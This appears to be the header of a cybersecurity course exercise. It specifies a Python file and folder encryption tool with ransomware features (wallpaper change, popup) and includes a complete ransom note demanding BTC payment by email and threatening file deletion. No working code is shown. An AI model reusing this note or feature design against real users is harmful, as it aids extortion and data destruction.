# Script:   code challenge 5             
# Author: Raheem Sharif Reed                     
# Date of latest revision: July 19,2023     
# Purpose:In Python, create a script that utilizes the cryptography library to:
#Prompt the user to select a mode:
#Encrypt a file (mode 1)
#Decrypt a file (mode 2)
#Encrypt a message (mode 3)
#Decrypt a message (mode 4)
#If mode 1 or 2 are selected, prompt the user to provide a filepath to a target file.
#If mode 3 or 4 are selected, prompt the user to provide a cleartext string.
#Depending on the selection, perform one of the below functions. Youâ€™ll need to create four functions:
#Encrypt the target file if in mode 1.
#Delete the existing target file and replace it entirely with the encrypted version.
#Decrypt the target file if in mode 2.
#Delete the encrypted target file and replace it entirely with the decrypted version.
#Encrypt the string if in mode 3.
#Print the ciphertext to the screen.
#Decrypt the string if in mode 4.
#Print the cleartext to the screen.
#Recursively encrypt a single folder and all its contents.
#Recursively decrypt a single folder that was encrypted by this tool.
#Alter the desktop wallpaper on a Windows PC with a ransomware message
#Create a popup window on a Windows PC with a ransomware message

The harddisks of your computer have been encrypted with an code geass encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to bankai@gamil.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
